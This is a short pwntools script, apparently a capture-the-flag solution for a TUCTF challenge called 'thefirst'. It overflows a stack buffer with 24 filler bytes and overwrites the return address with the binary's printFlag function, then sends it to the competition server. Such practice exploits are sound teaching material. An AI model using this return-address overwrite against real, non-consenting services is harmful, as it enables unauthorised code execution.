from pwn import *

#r = process("./thefirst")
r = remote("chal.tuctf.com", 30508)
e = ELF("./thefirst")

payload = ""
payload += "A" * 24
payload += p32(e.symbols["printFlag"])
r.sendline(payload)

r.recv()
print(r.recv())
